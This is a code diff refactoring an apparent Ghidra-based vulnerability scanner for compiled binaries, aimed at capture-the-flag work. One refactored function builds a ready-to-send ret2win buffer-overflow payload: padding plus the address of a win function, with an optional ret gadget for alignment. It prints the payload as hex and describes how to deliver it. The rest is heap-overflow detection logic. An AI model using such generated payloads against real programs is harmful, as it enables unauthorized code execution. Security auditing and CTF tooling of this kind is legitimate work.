@@ -528,55 +528,62 @@ def _boundary_writes(calls: Sequence[dict]) -> list[dict]:
 
 
 def _exact_ret2win(info: BinaryInfo, bounded: Sequence[dict], win_symbols: Sequence[str], symbol_addresses: dict) -> Finding | None:
+    target = _ret2win_target(info, win_symbols, symbol_addresses)
+    if target is None:
+        return None
+    chosen_name, chosen_address, address_key = target
+    pointer_size = info.bits // 8
+    for item in bounded:
+        finding = _ret2win_finding(info, item, chosen_name, chosen_address, address_key, pointer_size)
+        if finding is not None:
+            return finding
+    return None
+
+
+def _ret2win_target(info: BinaryInfo, win_symbols: Sequence[str], symbol_addresses: dict):
     address_key = "pie" if info.format in {"ELF", "Mach-O"} else "aslr"
-    if info.mitigations.get("stack_canary") is not False or info.mitigations.get(address_key) is not False:
+    mitigations = info.mitigations
+    if mitigations.get("stack_canary") is not False or mitigations.get(address_key) is not False:
         return None
     if info.bits not in {32, 64} or info.endian not in {"little", "big"}:
         return None
-    function_symbols = set(info.metadata.get("function_symbols") or ())
-    candidate_names = [name for name in win_symbols if name in function_symbols] if function_symbols else list(win_symbols)
-    addressed = [(name, symbol_addresses.get(name)) for name in candidate_names]
-    addressed = [(name, address) for name, address in addressed if isinstance(address, int) and address > 0]
-    if not addressed:
+    symbols = set(info.metadata.get("function_symbols") or ())
+    names = [name for name in win_symbols if name in symbols] if symbols else list(win_symbols)
+    return next(((name, address, address_key) for name in names
+                 if isinstance(address := symbol_addresses.get(name), int) and address > 0), None)
+
+
+def _ret2win_finding(info: BinaryInfo, item: dict, name: str, address: int,
+                     address_key: str, pointer_size: int) -> Finding | None:
+    offset = item["destination"].get("return_address_offset")
+    if not isinstance(offset, int) or offset <= 0 or item["requested"] < offset + pointer_size:
         return None
-    chosen_name, chosen_address = addressed[0]
-    pointer_size = info.bits // 8
-    for item in bounded:
-        return_offset = item["destination"].get("return_address_offset")
-        if not isinstance(return_offset, int) or return_offset <= 0:
-            continue
-        if item["requested"] < return_offset + pointer_size:
-            continue
-        payload = (b"A" * return_offset) + chosen_address.to_bytes(pointer_size, info.endian)
-        call = item["call"]
-        payload_hex = payload.hex()
-        evidence = [
-            "Ghidra recovered saved return address offset %d for %s at %s" % (return_offset, item["name"], call.get("from")),
-            "fixed %s address: 0x%x" % (chosen_name, chosen_address),
-            "stack canary disabled; %s disabled" % address_key,
-        ]
-        vector = "payload_hex=%s; send bytes.fromhex(\"%s\") to the input consumed by %s at %s." % (
-            payload_hex, payload_hex, item["name"], call.get("from"),
-        )
-        ret_gadgets = info.metadata.get("gadgets", {}).get("ret", []) if info.architecture == "x86_64" else []
-        if ret_gadgets:
-            ret_addr = ret_gadgets[0]
-            aligned = (b"A" * return_offset) + ret_addr.to_bytes(pointer_size, info.endian) + chosen_address.to_bytes(pointer_size, info.endian)
-            evidence.append("x86_64 ret gadget available at 0x%x for 16-byte stack alignment" % ret_addr)
-            vector += " If x86_64 movaps alignment fails, use aligned_payload_hex=%s (prepends ret gadget 0x%x)." % (aligned.hex(), ret_addr)
-        return _finding(
-            "PWN-FLAG-CHAIN-001", "Verified direct flag-path overwrite", "critical", "high",
-            evidence,
-            vector,
-            [
-                "Run only against the authorized challenge instance.",
-                "Confirm execution reaches %s and capture its flag output." % chosen_name,
-            ],
-            "Bound the write to the destination capacity and enable stack canaries plus position-independent code.",
-            "payload-ready",
-            "The payload overwrites the saved return address with %s (0x%x), the statically identified flag path." % (chosen_name, chosen_address),
-        )
-    return None
+    call = item["call"]
+    payload = b"A" * offset + address.to_bytes(pointer_size, info.endian)
+    payload_hex = payload.hex()
+    evidence = [
+        "Ghidra recovered saved return address offset %d for %s at %s" % (offset, item["name"], call.get("from")),
+        "fixed %s address: 0x%x" % (name, address),
+        "stack canary disabled; %s disabled" % address_key,
+    ]
+    vector = "payload_hex=%s; send bytes.fromhex(\"%s\") to the input consumed by %s at %s." % (
+        payload_hex, payload_hex, item["name"], call.get("from"),
+    )
+    gadgets = info.metadata.get("gadgets", {}).get("ret", []) if info.architecture == "x86_64" else []
+    if gadgets:
+        ret_addr = gadgets[0]
+        aligned = b"A" * offset + ret_addr.to_bytes(pointer_size, info.endian) + address.to_bytes(pointer_size, info.endian)
+        evidence.append("x86_64 ret gadget available at 0x%x for 16-byte stack alignment" % ret_addr)
+        vector += " If x86_64 movaps alignment fails, use aligned_payload_hex=%s (prepends ret gadget 0x%x)." % (aligned.hex(), ret_addr)
+    return _finding(
+        "PWN-FLAG-CHAIN-001", "Verified direct flag-path overwrite", "critical", "high",
+        evidence, vector,
+        ["Run only against the authorized challenge instance.",
+         "Confirm execution reaches %s and capture its flag output." % name],
+        "Bound the write to the destination capacity and enable stack canaries plus position-independent code.",
+        "payload-ready",
+        "The payload overwrites the saved return address with %s (0x%x), the statically identified flag path." % (name, address),
+    )
 
 
 def _check_bounded_overflows(bounded: Sequence[dict]) -> Optional[Finding]:
@@ -872,21 +879,18 @@ def _check_snprintf_return_misuse(ghidra_calls: Sequence[dict], cfg: dict | None
 
 
 def _allocated_chunk_size(call: dict, name: str) -> Optional[int]:
-    if name == "malloc":
-        arg = _call_argument(call, 0)
-        val = arg.get("value") if arg.get("kind") == "constant" else None
-        return val if isinstance(val, int) and val > 0 else None
-    if name == "realloc":
-        arg = _call_argument(call, 1)
-        val = arg.get("value") if arg.get("kind") == "constant" else None
-        return val if isinstance(val, int) and val > 0 else None
-    if name == "calloc":
-        a0, a1 = _call_argument(call, 0), _call_argument(call, 1)
-        if a0.get("kind") == "constant" and a1.get("kind") == "constant":
-            v0, v1 = a0.get("value"), a1.get("value")
-            if isinstance(v0, int) and isinstance(v1, int) and v0 > 0 and v1 > 0:
-                return v0 * v1
-    return None
+    indexes = {"malloc": (0,), "realloc": (1,), "calloc": (0, 1)}.get(name)
+    if indexes is None:
+        return None
+    values = [_constant_argument(_call_argument(call, index)) for index in indexes]
+    if any(value is None or value <= 0 for value in values):
+        return None
+    return values[0] if len(values) == 1 else values[0] * values[1]
+
+
+def _constant_argument(argument: dict) -> Optional[int]:
+    value = argument.get("value") if argument.get("kind") == "constant" else None
+    return value if isinstance(value, int) else None
 
 
 def _update_chunk_sizes(call: dict, function: str, name: str, chunk_sizes: dict) -> None:
@@ -904,23 +908,31 @@ def _heap_chunk_overflows(calls: Sequence[dict]) -> list[dict]:
     for call in sorted(calls, key=lambda item: (str(item.get("function") or ""), _call_sort_key(item), str(item.get("from") or ""))):
         function = call.get("function") or UNKNOWN
         name = _call_name(call)
-        if name in {"malloc", "calloc", "realloc"}:
-            _update_chunk_sizes(call, function, name, chunk_sizes)
-            continue
-        if name in DEALLOCATORS:
-            freed_id = _argument_identity(_call_argument(call, 0))
-            if freed_id:
-                chunk_sizes.pop((function, freed_id), None)
-            continue
-        request = _write_request(call, name)
-        if request is None:
-            continue
-        dest_idx, requested = request
-        dest_id = _argument_identity(_call_argument(call, dest_idx))
-        capacity = chunk_sizes.get((function, dest_id)) if dest_id else None
-        if capacity is not None and requested > capacity:
-            overflows.append({"call": call, "name": name, "capacity": capacity, "requested": requested})
+        overflow = _heap_call_overflow(call, function, name, chunk_sizes)
+        if overflow is not None:
+            overflows.append(overflow)
     return overflows
+
+
+def _heap_call_overflow(call: dict, function: str, name: str,
+                        chunk_sizes: dict[tuple[str, str], int]) -> Optional[dict]:
+    if name in {"malloc", "calloc", "realloc"}:
+        _update_chunk_sizes(call, function, name, chunk_sizes)
+        return None
+    if name in DEALLOCATORS:
+        freed_id = _argument_identity(_call_argument(call, 0))
+        if freed_id:
+            chunk_sizes.pop((function, freed_id), None)
+        return None
+    request = _write_request(call, name)
+    if request is None:
+        return None
+    dest_idx, requested = request
+    dest_id = _argument_identity(_call_argument(call, dest_idx))
+    capacity = chunk_sizes.get((function, dest_id)) if dest_id else None
+    if capacity is None or requested <= capacity:
+        return None
+    return {"call": call, "name": name, "capacity": capacity, "requested": requested}
 
 
 def _check_heap_overflows(ghidra_calls: Sequence[dict]) -> Optional[Finding]:
